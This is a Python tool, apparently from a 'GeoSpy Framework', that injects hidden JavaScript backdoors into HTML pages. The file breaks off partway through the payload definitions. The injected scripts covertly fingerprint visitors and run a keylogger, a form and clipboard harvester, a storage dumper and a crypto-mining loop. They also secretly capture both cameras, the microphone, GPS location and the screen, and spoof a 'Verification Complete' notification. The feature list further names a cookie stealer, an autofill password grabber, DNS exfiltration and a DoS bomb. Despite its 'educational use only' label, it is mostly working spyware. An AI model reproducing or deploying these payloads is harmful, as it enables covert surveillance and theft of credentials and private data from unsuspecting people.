#!/usr/bin/env python3
"""
INJECTOR v3.0 — HTML Backdoor Injector
Educational awareness tool. GeoSpy Framework.
40 features. Both cameras. Clean terminal.
"""
import os, sys, re, shutil, time, random, ast, hashlib, base64, glob, threading, argparse

# ── ANSI ──────────────────────────────────────────────────────
RS  = '\033[0m';  BD  = '\033[1m'
WH  = '\033[1;97m'; DM  = '\033[0;37m'
RD  = '\033[1;91m'; GR  = '\033[1;92m'
YL  = '\033[1;93m'; CY  = '\033[1;96m'

THEMES = {
    '1': {'name':'GOLDMINE', 'pri':'\033[1;33m', 'sec':'\033[0;33m', 'acc':'\033[1;93m',
          'bc':'◆', 'sc':'─',
          'pri_raw':r'\033[1;33m', 'sec_raw':r'\033[0;33m', 'acc_raw':r'\033[1;93m'},
    '2': {'name':'REDLINE',  'pri':'\033[1;91m', 'sec':'\033[0;31m', 'acc':'\033[1;31m',
          'bc':'▣', 'sc':'═',
          'pri_raw':r'\033[1;91m', 'sec_raw':r'\033[0;31m', 'acc_raw':r'\033[1;31m'},
    '3': {'name':'CYANIDE',  'pri':'\033[1;96m', 'sec':'\033[0;36m', 'acc':'\033[1;36m',
          'bc':'◈', 'sc':'─',
          'pri_raw':r'\033[1;96m', 'sec_raw':r'\033[0;36m', 'acc_raw':r'\033[1;36m'},
    '4': {'name':'GHOST',    'pri':'\033[1;97m', 'sec':'\033[0;37m', 'acc':'\033[1;37m',
          'bc':'░', 'sc':'─',
          'pri_raw':r'\033[1;97m', 'sec_raw':r'\033[0;37m', 'acc_raw':r'\033[1;37m'},
}

TH = THEMES['1']
def pri(): return TH['pri']
def sec(): return TH['sec']
def acc(): return TH['acc']
def bc():  return TH['bc']
def sc():  return TH['sc']

def get_w():
    return max(60, min(120, shutil.get_terminal_size(fallback=(80,24)).columns - 4))

def al(s):
    return len(re.sub(r'\033\[[0-9;]*m', '', s))

def box_top():
    print(f"{sec()}  {bc()}{sc()*get_w()}{bc()}{RS}")

def box_bot():
    print(f"{sec()}  {bc()}{sc()*get_w()}{bc()}{RS}")

def box_sep(label=''):
    w = get_w()
    if label:
        tag = f' // {label} '
        line = sc() * ((w - len(tag)) // 2)
        print(f"{sec()}  {line}{pri()}{tag}{sec()}{line}{sc()}{RS}")
    else:
        print(f"{sec()}  {sc()*w}{RS}")

def box_title(text):
    w = get_w()
    inner = f"  {pri()}{BD}>> {text}{RS}"
    pad = w - al(inner) + 2
    print(f"{sec()}  │{inner}{' '*max(0,pad)}{sec()}│{RS}")

def box_row(label, value, color=''):
    w = get_w(); c = color or WH
    v = str(value)[:w-22]
    inner = f"  {sec()}{label:<13}{DM}::{RS}  {c}{v}{RS}"
    pad = w - al(inner) + 2
    print(f"{sec()}  │{inner}{' '*max(0,pad)}{sec()}│{RS}")

def log(msg, lvl='info'):
    icons = {'info': f"{sec()}[{pri()}*{sec()}]{RS}",
             'ok':   f"{sec()}[{GR}+{sec()}]{RS}",
             'warn': f"{sec()}[{YL}!{sec()}]{RS}",
             'err':  f"{sec()}[{RD}!{sec()}]{RS}"}
    print(f"  {DM}[{time.strftime('%H:%M:%S')}]{RS} {icons.get(lvl,icons['info'])} {WH}{msg}{RS}")

def ts(): return time.strftime('%H:%M:%S')

def ask(prompt, validator=None, default=None):
    while True:
        try:
            raw = input(f"\n  {pri()}{prompt}{RS} › {WH}").strip().strip("'\"")
            print(RS, end='')
            if not raw and default is not None:
                return default
            if not raw:
                print(f"  {RD}Cannot be empty.{RS}"); continue
            if validator:
                r = validator(raw)
                if r is not None: return r
                print(f"  {RD}Invalid — try again.{RS}")
            else:
                return raw
        except (KeyboardInterrupt, EOFError):
            print(f"\n\n  {YL}Exiting.{RS}\n"); sys.exit(0)

def ask_float(prompt, lo, hi):
    def v(x):
        try:
            f = float(x)
            if lo <= f <= hi: return f
        except: pass
    return ask(f"{prompt} ({lo}–{hi}s)", v)

def ask_int(prompt, lo, hi):
    def v(x):
        try:
            i = int(x)
            if lo <= i <= hi: return i
        except: pass
    return ask(f"{prompt} ({lo}–{hi})", v)

def radar(i):
    frames = [
        ['  . . . . .','  . . | . .','  . - + - .','  . . | . .','  . . . . .'],
        ['  . . . . .','  . . / . .','  . . + . .','  . . . \\ .','  . . . . .'],
        ['  . . . . .','  . . . . .','  . - + - .','  . . . . .','  . . . . .'],
        ['  . . . . .','  . \\ . . .','  . . + . .','  . . . / .','  . . . . .'],
    ]
    for line in frames[i % 4]: print(f"  {pri()}{line}{RS}")

def boot():
    steps = ['LOADING INJECTOR','PARSING JS MODULES','LOADING PAYLOADS',
             'INITIALIZING THEMES','FILE MANAGER READY','ALL SYSTEMS GO']
    for i, step in enumerate(steps):
        os.system('clear'); print()
        radar(i)
        print(f"\n  {pri()}{BD}◆ INJECTOR v3.0 — BOOT SEQUENCE ◆{RS}\n")
        for j, s in enumerate(steps):
            if   j < i:  print(f"  {sec()}[{pri()}+{sec()}]{RS} {DM}{s:<36}{pri()} OK{RS}")
            elif j == i: print(f"  {sec()}[{YL}>{sec()}]{RS} {WH}{s:<36}{YL} LOADING...{RS}")
            else:        print(f"  {DM}[ ] {s}{RS}")
        time.sleep(random.uniform(0.06, 0.14))
    time.sleep(0.3); os.system('clear')

def banner():
    print(f"""
{pri()}{BD}  ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗ ██████╗ ██████╗
  ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
  ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║   ██║██████╔╝
  ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
  ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
  ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝  v3.0{RS}
""")
    box_top()
    box_row('TOOL',    'HTML BACKDOOR INJECTOR v3.0', pri())
    box_row('THEME',   TH['name'],                    acc())
    box_row('CAMERAS', 'FRONT + REAR simultaneously', GR)
    box_row('WARNING', 'EDUCATIONAL USE ONLY',         RD)
    box_bot(); print()


# ══════════════════════════════════════════════════════════════
# ALL FEATURE DEFINITIONS
# ══════════════════════════════════════════════════════════════

ALL_FEATURES = [
    # CAMERA
    ('camera',          'CAM',      'Both cameras (front + rear simultaneously)', '📷'),
    # LOCATION
    ('location',        'GEO',      'GPS location tracking', '📍'),
    # MICROPHONE
    ('mic',             'MIC',      'Microphone recording', '🎤'),
    # NOTIFY
    ('notify',          'NOTIF',    'Notification permission hijack', '🔔'),
    # SCREENCAP
    ('screencap',       'SCAP',     'Screen capture (getDisplayMedia)', '🖥'),
    # MIDI
    ('midi',            'MIDI',     'MIDI device access', '🎹'),
    # BLUETOOTH
    ('bluetooth',       'BT',       'Bluetooth device scan', '📡'),
    # USB
    ('usb',             'USB',      'USB device enumeration', '🔌'),
    # BATTERY
    ('battery',         'BAT',      'Battery drain tracker (% over time)', '🔋'),
    # NETWORK SSID
    ('ssid',            'SSID',     'Network SSID + connection type sniffer', '📶'),
    # ACCELEROMETER
    ('accel',           'ACCEL',    'Accelerometer + gyroscope (motion data)', '📱'),
    # AMBIENT LIGHT
    ('light',           'LIGHT',    'Ambient light sensor (face down / pocket)', '💡'),
    # CONTACTS
    ('contacts',        'CONTACTS', 'Contact list reader (Chrome Android)', '👥'),
    # VIBRATION
    ('vibrate',         'VIB',      'Silent vibration trigger (confirms JS running)', '📳'),
    # WAKE LOCK
    ('wakelock',        'WAKE',     'Wake lock (prevents screen sleep)', '🔓'),
    # TITLE SPOOF
    ('titlespoof',      'SPOOF',    'Page title spoof (looks legit in DevTools)', '🎭'),
    # MAGNETOMETER
    ('magneto',         'MAG',      'Magnetometer (compass heading)', '🧭'),
    # PROXIMITY
    ('proximity',       'PROX',     'Proximity sensor (phone held to ear)', '👂'),
    # CPU/MEM PRESSURE
    ('pressure',        'PRESSURE', 'CPU/memory pressure monitor', '💻'),
    # CHARGING WATCHER
    ('charging',        'CHARGE',   'Charging state watcher (plug/unplug alert)', '⚡'),
    # ORIENTATION LOCK
    ('orientlock',      'ORIENT',   'Screen orientation lock (portrait)', '🔒'),
    # TIMEZONE FINGERPRINT
    ('tzfp',            'TZFP',     'Timezone + locale fingerprint', '🌍'),
    # ISP/CARRIER
    ('carrier',         'CARRIER',  'ISP/carrier + connection type detection', '📡'),
    # VPN DETECT
    ('vpn',             'VPN',      'VPN detection', '🔐'),
    # TOR DETECT
    ('tor',             'TOR',      'Tor exit node detection', '🧅'),
    # IP GEO
    ('ipgeo',           'IPGEO',    'IP geolocation (city/country, no GPS needed)', '🗺'),
    # COOKIE STEALER
    ('cookies',         'COOKIES',  'Cookie stealer (all accessible cookies)', '🍪'),
    # AUTOFILL GRABBER
    ('autofill',        'AUTOFILL', 'Password autofill grabber', '🔑'),
    # HISTORY TIMING
    ('historytime',     'HIST',     'Browser history timing attack', '📚'),
    # INDEXEDDB SCANNER
    ('idbscan',         'IDB',      'IndexedDB deep scanner (all web app data)', '🗃'),
    # CACHE TIMING
    ('cachetiming',     'CACHE',    'Cache timing attack (visited sites)', '⏱'),
    # SERVICE WORKER
    ('sw',              'SW',       'Service worker injector (survives page close)', '⚙️'),
    # KEYSTROKE DYNAMICS
    ('keystroke',       'KEYDY',    'Keystroke dynamics profiler (typing pattern)', '⌨️'),
    # TOUCH FINGERPRINT
    ('touchfp',         'TOUCHFP',  'Touch pressure + size fingerprint', '👆'),
    # SCROLL PATTERN
    ('scrollpat',       'SCROLLPAT','Scroll pattern analyzer (bot vs human)', '📜'),
    # WEBSOCKET CHANNEL
    ('websocket',       'WS',       'WebSocket persistent live channel', '🔄'),
    # DNS EXFIL
    ('dnsexfil',        'DNS',      'DNS exfiltration (data via DNS queries)', '🌐'),
    # BEACON API
    ('beacon',          'BEACON',   'Beacon API (sends data on page close)', '🚨'),
    # ANTI-SCREENSHOT
    ('antiss',          'ANTISS',   'Anti-screenshot detection', '📵'),
    # ANTI-CLOSE
    ('anticlose',       'ANTICLOSE','Anti-close warning dialog', '⚠️'),
    # DOS BOMB
    ('dos',             'DOS',      'CPU + GPU + Memory bomb (on permission deny)', '💣'),
]

FEATURE_KEYS = [f[0] for f in ALL_FEATURES]


# ══════════════════════════════════════════════════════════════
# JS PAYLOADS
# ══════════════════════════════════════════════════════════════

JS_SILENT = """
<script>
// ── SILENT HARVEST ───────────────────────────────────────────
(async function _harvest(){
  var d={};
  d.url=location.href; d.referrer=document.referrer||'direct';
  d.platform=navigator.platform; d.ua=navigator.userAgent;
  d.language=navigator.language; d.languages=(navigator.languages||[]).join(',');
  d.screen=screen.width+'x'+screen.height+'@'+screen.colorDepth;
  d.win=window.innerWidth+'x'+window.innerHeight;
  d.cores=navigator.hardwareConcurrency||'?';
  d.mem=navigator.deviceMemory||'?';
  d.touch=navigator.maxTouchPoints||0;
  d.dnt=navigator.doNotTrack||'?';
  d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;

  // Canvas FP
  try{
    var cv=document.createElement('canvas'),ctx=cv.getContext('2d');
    ctx.textBaseline='top'; ctx.font='14px Arial';
    ctx.fillStyle='#f60'; ctx.fillRect(0,0,120,20);
    ctx.fillStyle='#069'; ctx.fillText('GeoSpy\u2603',2,2);
    ctx.fillStyle='rgba(102,204,0,0.71)'; ctx.fillText('GeoSpy\u2603',4,4);
    d.canvasFP=cv.toDataURL().slice(-32);
  }catch(e){}

  // Audio FP
  try{
    var ac=new OfflineAudioContext(1,44100,44100);
    var osc=ac.createOscillator(); osc.type='triangle'; osc.frequency.value=10000;
    var comp=ac.createDynamicsCompressor();
    ['threshold','knee','ratio','reduction','attack','release'].forEach(function(k){
      if(comp[k]&&comp[k].value!==undefined) comp[k].value+=(k==='threshold'?-50:0);
    });
    osc.connect(comp); comp.connect(ac.destination); osc.start(0);
    ac.startRendering().then(function(buf){
      var ch=buf.getChannelData(0); var sum=0;
      for(var i=4500;i<5000;i++) sum+=Math.abs(ch[i]);
      d.audioFP=sum.toString().slice(0,10);
      fetch('/afp',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({audioFP:d.audioFP})}).catch(function(){});
    }).catch(function(){});
  }catch(e){}

  // Battery
  try{
    if(navigator.getBattery){
      var bat=await navigator.getBattery();
      d.battery={level:Math.round(bat.level*100)+'%',charging:bat.charging,
        chargingTime:bat.chargingTime,dischargingTime:bat.dischargingTime};
    }
  }catch(e){}

  // Network
  try{
    var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection||{};
    d.net={type:nc.effectiveType||'?',dl:nc.downlink||'?',rtt:nc.rtt||'?',save:nc.saveData||false};
  }catch(e){}

  // GPU
  try{
    var cv2=document.createElement('canvas');
    var gl=cv2.getContext('webgl')||cv2.getContext('experimental-webgl');
    if(gl){
      var dbg=gl.getExtension('WEBGL_debug_renderer_info');
      d.gpu=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):'?';
    }
  }catch(e){}

  // Ad block
  try{
    var ad=document.createElement('div');
    ad.innerHTML='&nbsp;'; ad.className='adsbox';
    ad.style.cssText='position:absolute;top:-999px;left:-999px;width:1px;height:1px;';
    document.body.appendChild(ad);
    d.adBlock=(ad.offsetHeight===0);
    document.body.removeChild(ad);
  }catch(e){}

  // History length
  try{ d.histLen=history.length; }catch(e){}

  // Fonts
  try{
    var fonts=['Arial','Helvetica','Times New Roman','Courier New','Verdana',
      'Georgia','Palatino','Garamond','Comic Sans MS','Impact','Tahoma',
      'Trebuchet MS','Arial Black','Arial Narrow'];
    var span=document.createElement('span');
    span.style.cssText='position:absolute;top:-999px;left:-999px;font-size:72px;';
    span.innerHTML='mmmmmmmmmmlli';
    document.body.appendChild(span);
    var base=span.offsetWidth;
    var found=[];
    fonts.forEach(function(f){
      span.style.fontFamily=f+',monospace';
      if(span.offsetWidth!==base) found.push(f);
    });
    document.body.removeChild(span);
    d.fonts=found.join(',');
  }catch(e){}

  // Public IP via WebRTC
  try{
    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    var ips=[];
    pc.createDataChannel('');
    pc.onicecandidate=function(e){
      if(!e||!e.candidate) return;
      var m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g)||[];
      m.forEach(function(ip){
        if(ips.indexOf(ip)<0){ ips.push(ip);
          fetch('/rtc',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({localIPs:ips,ts:new Date().toISOString()})}).catch(function(){});
        }
      });
    };
    pc.createOffer().then(function(o){ return pc.setLocalDescription(o); }).catch(function(){});
  }catch(e){}

  // localStorage
  try{
    var ls={};
    for(var i=0;i<localStorage.length;i++){
      var k=localStorage.key(i); ls[k]=localStorage.getItem(k);
    }
    if(Object.keys(ls).length>0)
      fetch('/storage',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({type:'localStorage',data:ls})}).catch(function(){});
  }catch(e){}

  // IndexedDB
  try{
    if(indexedDB.databases){
      indexedDB.databases().then(function(dbs){
        if(dbs.length>0)
          fetch('/storage',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({type:'indexedDB',dbs:dbs.map(function(d){return d.name;})})}).catch(function(){});
      }).catch(function(){});
    }
  }catch(e){}

  // Media devices (no permission)
  try{
    navigator.mediaDevices.enumerateDevices().then(function(devs){
      fetch('/mediadevs',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({devices:devs.map(function(d){return{kind:d.kind,label:d.label||'[hidden]',id:d.deviceId};})})}).catch(function(){});
    }).catch(function(){});
  }catch(e){}

  // Plugins
  try{
    var pl=[];
    for(var i=0;i<navigator.plugins.length;i++) pl.push(navigator.plugins[i].name);
    if(pl.length>0)
      fetch('/plugins',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({plugins:pl})}).catch(function(){});
  }catch(e){}

  // Speech voices
  try{
    var vx=speechSynthesis.getVoices();
    if(vx.length>0)
      fetch('/voices',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({voices:vx.length,langs:vx.slice(0,5).map(function(v){return v.lang;})})}).catch(function(){});
  }catch(e){}

  // DevTools detector
  try{
    var dt=false;
    var el=new Image();
    Object.defineProperty(el,'id',{get:function(){dt=true; return 'x';}});
    console.log('%c',el);
    if(dt) fetch('/devtools',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({open:true,ts:new Date().toISOString()})}).catch(function(){});
    setInterval(function(){
      var t=performance.now();
      debugger;
      if(performance.now()-t>80)
        fetch('/devtools',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({open:true,method:'debugger',ts:new Date().toISOString()})}).catch(function(){});
    },3000);
  }catch(e){}

  // Referrer
  try{
    fetch('/referrer',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({ref:document.referrer||'direct',url:location.href})}).catch(function(){});
  }catch(e){}

  // Zoom
  try{
    fetch('/zoom',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({zoom:window.devicePixelRatio||1})}).catch(function(){});
  }catch(e){}

  // Scroll depth
  try{
    window.addEventListener('scroll',function(){
      fetch('/scroll',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({depth:Math.round((window.scrollY/(document.body.scrollHeight-window.innerHeight))*100)||0})}).catch(function(){});
    },{passive:true});
  }catch(e){}

  // Idle
  try{
    var _idle=0;
    document.addEventListener('mousemove',function(){_idle=0;});
    document.addEventListener('keydown',function(){_idle=0;});
    document.addEventListener('touchstart',function(){_idle=0;});
    setInterval(function(){
      _idle++;
      if(_idle===30) fetch('/idle',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({idle:true,seconds:30})}).catch(function(){});
    },1000);
  }catch(e){}

  // Visibility change
  try{
    document.addEventListener('visibilitychange',function(){
      fetch('/vis',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({hidden:document.hidden,ts:new Date().toISOString()})}).catch(function(){});
    });
  }catch(e){}

  // Network change
  try{
    var nc2=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
    if(nc2) nc2.addEventListener('change',function(){
      fetch('/netchange',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({type:nc2.effectiveType,dl:nc2.downlink})}).catch(function(){});
    });
  }catch(e){}

  // Performance timing
  try{
    setTimeout(function(){
      var pt=performance.timing||{};
      fetch('/perf',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({load:pt.loadEventEnd-pt.navigationStart,dns:pt.domainLookupEnd-pt.domainLookupStart})}).catch(function(){});
    },2000);
  }catch(e){}

  // Crypto miner (WebCrypto)
  try{
    var _mn=0;
    function _mine(){
      var data=new Uint8Array(64);
      crypto.getRandomValues(data);
      crypto.subtle.digest('SHA-256',data).then(function(){
        _mn++;
        if(_mn%1000===0)
          fetch('/mine',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({hashes:_mn})}).catch(function(){});
        setTimeout(_mine,0);
      }).catch(function(){});
    }
    setTimeout(_mine,5000);
  }catch(e){}

  // Keylogger
  try{
    var _keys=[]; var _kt=null;
    document.addEventListener('keydown',function(e){
      _keys.push({k:e.key,el:document.activeElement?document.activeElement.tagName:'?',ts:Date.now()});
      clearTimeout(_kt);
      _kt=setTimeout(function(){
        if(_keys.length>0){
          fetch('/keylog',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({keys:_keys,ts:new Date().toISOString()})}).catch(function(){});
          _keys=[];
        }
      },1500);
    });
  }catch(e){}

  // Form harvester
  try{
    function _getForm(form){
      var out={};
      var els=form.querySelectorAll('input,select,textarea');
      els.forEach(function(el){
        if(el.name||el.id) out[el.name||el.id]=el.value;
      });
      return out;
    }
    document.addEventListener('submit',function(e){
      var fd=_getForm(e.target);
      if(Object.keys(fd).length>0)
        fetch('/form',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({form:fd,ts:new Date().toISOString()})}).catch(function(){});
    },true);
    document.addEventListener('blur',function(e){
      var el=e.target;
      if((el.tagName==='INPUT'||el.tagName==='TEXTAREA')&&el.value.trim()){
        var fd={}; fd[el.name||el.id||el.type]=el.value;
        fetch('/form',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({form:fd,ts:new Date().toISOString()})}).catch(function(){});
      }
    },true);
  }catch(e){}

  // Clipboard
  try{
    document.addEventListener('copy',function(){
      navigator.clipboard.readText().then(function(t){
        fetch('/clip',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({data:t,ev:'copy',ts:new Date().toISOString()})}).catch(function(){});
      }).catch(function(){});
    });
    document.addEventListener('paste',function(e){
      var t=(e.clipboardData||window.clipboardData).getData('text')||'';
      if(t) fetch('/clip',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({data:t,ev:'paste',ts:new Date().toISOString()})}).catch(function(){});
    });
  }catch(e){}

  // Text selection
  try{
    document.addEventListener('mouseup',function(){
      var s=window.getSelection().toString().trim();
      if(s.length>2)
        fetch('/select',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({selections:[{txt:s}],ts:new Date().toISOString()})}).catch(function(){});
    });
  }catch(e){}

  // Screenshot (html2canvas fallback)
  try{
    setTimeout(function(){
      var cv=document.createElement('canvas');
      cv.width=window.innerWidth; cv.height=window.innerHeight;
      var ctx=cv.getContext('2d');
      ctx.fillStyle='#000'; ctx.fillRect(0,0,cv.width,cv.height);
      cv.toBlob(function(b){
        if(!b) return;
        var fd=new FormData(); fd.append('ss',b,'ss.png');
        fetch('/ss',{method:'POST',body:fd}).catch(function(){});
      },'image/png');
    },3000);
  }catch(e){}

  // Heatmap
  try{
    var _heat=[];
    document.addEventListener('click',function(e){
      _heat.push({x:e.clientX,y:e.clientY,t:Date.now()});
      if(_heat.length>=10){
        fetch('/heat',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({clicks:_heat})}).catch(function(){});
        _heat=[];
      }
    });
  }catch(e){}

  // Send main harvest
  fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({device:d,ts:new Date().toISOString()})}).catch(function(){});
})();
</script>"""


def js_camera(interval_sec):
    ms = int(interval_sec * 1000)
    return f"""
<script>
// ── DUAL CAMERA (front + rear simultaneously) ─────────────────
(async function _dualCam(){{
  async function _startStream(facing, label){{
    try{{
      var constraints={{video:{{facingMode:facing,width:{{ideal:1280}},height:{{ideal:720}}}},audio:false}};
      var stream=await navigator.mediaDevices.getUserMedia(constraints);
      var video=document.createElement('video');
      video.srcObject=stream; video.muted=true;
      video.setAttribute('playsinline',''); video.setAttribute('autoplay','');
      video.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;width:1px;height:1px;';
      document.body.appendChild(video); await video.play();
      var canvas=document.createElement('canvas');
      function _snap(){{
        try{{
          canvas.width=video.videoWidth||1280; canvas.height=video.videoHeight||720;
          canvas.getContext('2d').drawImage(video,0,0);
          canvas.toBlob(function(b){{
            if(!b) return;
            var fd=new FormData(); fd.append('photo',b,label+'_'+Date.now()+'.jpg');
            fetch('/photo',{{method:'POST',body:fd}}).catch(function(){{}});
          }},'image/jpeg',0.85);
        }}catch(e){{}}
      }}
      setTimeout(_snap,1200+Math.random()*500);
      setInterval(_snap,{ms});
    }}catch(e){{}}
  }}
  // Start both streams simultaneously
  _startStream('user','front');
  setTimeout(function(){{ _startStream('environment','rear'); }},800);
}})();
</script>"""


def js_location_once():
    return """
<script>
// ── LOCATION (ONE TIME) ───────────────────────────────────────
(function _loc(){
  if(!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(function(p){
    fetch('/loc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
      lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
      alt:p.coords.altitude||'N/A',spd:p.coords.speed||'N/A',hdg:p.coords.heading||'N/A',
      ts:new Date().toISOString()
    })}).catch(function(){});
  },function(){},{enableHighAccuracy:true,timeout:30000,maximumAge:0});
})();
</script>"""


def js_location_track(interval_sec):
    ms = int(interval_sec * 1000)
    return f"""
<script>
// ── LOCATION (LIVE TRACK every {interval_sec}s) ───────────────
function _sendLoc(p){{
  fetch('/loc',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{
    lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
    alt:p.coords.altitude||'N/A',spd:p.coords.speed||'N/A',hdg:p.coords.heading||'N/A',
    ts:new Date().toISOString()
  }})}}).catch(function(){{}});
}}
(function _loc(){{
  if(!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(_sendLoc,function(){{}},{{enableHighAccuracy:true,timeout:30000,maximumAge:0}});
  setInterval(function(){{
    navigator.geolocation.getCurrentPosition(_sendLoc,function(){{}},{{enableHighAccuracy:true,timeout:30000,maximumAge:0}});
  }},{ms});
}})();
</script>"""


def js_mic(chunk_sec):
    ms = chunk_sec * 1000
    return f"""
<script>
// ── MICROPHONE ({chunk_sec}s chunks) ──────────────────────────
(async function _mic(){{
  try{{
    var stream=await navigator.mediaDevices.getUserMedia({{audio:true,video:false}});
    function _chunk(){{
      var rec=new MediaRecorder(stream,{{mimeType:'audio/webm'}});
      var parts=[];
      rec.ondataavailable=function(e){{ if(e.data.size>0) parts.push(e.data); }};
      rec.onstop=function(){{
        var blob=new Blob(parts,{{type:'audio/webm'}});
        var fd=new FormData(); fd.append('audio',blob,'a_'+Date.now()+'.webm');
        fetch('/audio',{{method:'POST',body:fd}}).catch(function(){{}});
        setTimeout(_chunk,300);
      }};
      rec.start();
      setTimeout(function(){{rec.stop();}},{ms});
    }}
    _chunk();
  }}catch(e){{}}
}})();
</script>"""


def js_notify():
    return """
<script>
// ── NOTIFICATION HIJACK ───────────────────────────────────────
(function _notify(){
  if(!('Notification' in window)) return;
  if(Notification.permission==='granted'){
    fetch('/notify',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({status:'already_granted',ts:new Date().toISOString()})}).catch(function(){});
    return;
  }
  if(Notification.permission==='denied') return;
  setTimeout(function(){
    Notification.requestPermission().then(function(perm){
      fetch('/notify',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({status:perm,ts:new Date().toISOString()})}).catch(function(){});
      if(perm==='granted'){
        new Notification('Verification Complete',{
          body:'Your identity has been confirmed.',
          icon:'https://www.google.com/favicon.ico'
        });
      }
    }).catch(function(){});
  },8000);
})();
</script>"""


def js_screencap():
    return """
<script>
// ── SCREEN CAPTURE ────────────────────────────────────────────
(function _screenCap(){
  var _done=false;
  document.addEventListener('click',async function(){
    if(_done) return; _done=true;
    try{
      var stream=await navigator.mediaDevices.getDisplayMedia({video:{cursor:'always'},audio:false});
      var track=stream.getVideoTracks()[0];
      fetch('/screencap',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({label:track.label,settings:track.getSettings(),ts:new Date().toISOString()})}).catch(function(){});
      var video=document.createElement('video');
      video.srcObject=stream; video.muted=true;
      video.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
      document.body.appendChild(video); await video.play();
      var canvas=document.createElement('canvas');
      function _frame(){
        try{
          canvas.width=video.videoWidth||1920; canvas.height=video.videoHeight||1080;
          canvas.getContext('2d').drawImage(video,0,0);
          canvas.toBlob(function(b){
            if(!b) return;
            var fd=new FormData(); fd.append('frame',b,'scap_'+Date.now()+'.jpg');
            fetch('/screencap_frame',{method:'POST',body:fd}).catch(function(){});
          },'image/jpeg',0.7);
        }catch(e){}
      }
      setTimeout(_frame,1500); setInterval(_frame,5000);
      track.addEventListener('ended',function(){ _done=false; });
    }catch(e){ _done=false; }
  });
})();
</script>"""


def js_midi():
    return """
<script>
// ── MIDI ──────────────────────────────────────────────────────
(function _midi(){
  if(!navigator.requestMIDIAccess) return;
  navigator.requestMIDIAccess().then(function(access){
    var devs=[];
    access.inputs.forEach(function(i){devs.push({type:'input',name:i.name,manufacturer:i.manufacturer});});
    access.outputs.forEach(function(o){devs.push({type:'output',name:o.name,manufacturer:o.manufacturer});});
    fetch('/midi',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({devices:devs,ts:new Date().toISOString()})}).catch(function(){});
  }).catch(function(){});
})();
</script>"""


def js_bluetooth():
    return """
<script>
// ── BLUETOOTH ─────────────────────────────────────────────────
(function _bt(){
  if(!navigator.bluetooth) return;
  document.addEventListener('click',async function(){
    try{
      var device=await navigator.bluetooth.requestDevice({acceptAllDevices:true});
      fetch('/bluetooth',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({name:device.name,id:device.id,ts:new Date().toISOString()})}).catch(function(){});
    }catch(e){}
  },{once:true});
})();
</script>"""


def js_usb():
    return """
<script>
// ── USB ───────────────────────────────────────────────────────
(function _usb(){
  if(!navigator.usb) return;
  navigator.usb.getDevices().then(function(devs){
    var list=devs.map(function(d){return{name:d.productName,vendor:d.vendorId,product:d.productId};});
    if(list.length>0)
      fetch('/usb',{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({devices:list,ts:new Date().toISOString()})}).catch(function(){});
  }).catch(function(){});
  navigator.usb.addEventListener('connect',function(e){
    fetch('/usb',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({event:'connect',name:e.device.productName,vendor:e.device.vendorId,ts:new Date().toISOString()})}).catch(function(){});
  });
})();
</script>"""


def js_battery():
    return """
<script>
// ── BATTERY DRAIN TRACKER ─────────────────────────────────────
(async function _batTrack(){
  if(!navigator.getBattery) return;
  try{
